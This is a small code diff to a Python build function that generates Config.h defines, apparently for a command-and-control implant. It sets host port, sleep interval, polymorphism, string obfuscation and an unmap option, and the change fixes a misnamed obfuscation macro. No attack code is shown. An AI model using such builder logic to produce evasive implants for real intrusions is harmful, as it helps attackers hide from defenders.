@@ -31,9 +31,8 @@ def process_config_h(config: dict):
 #define CONFIG_PORT {config_host_port}
 #define CONFIG_SECURE {str(config_host_secure).upper()}
 #define CONFIG_SLEEP {config_sleep} 
-
 #define CONFIG_POLY {str(config_poly).upper()}  
-#define CONFIG_POLY {str(config_obf_strings).upper()}  
+#define CONFIG_OBF_STRINGS {str(config_obf_strings).upper()}  
     ''' ##define CONFIG_UNMAP {str(config_unmap).upper()}
 
     for filepath in glob.iglob('**/Config.h', recursive=True):
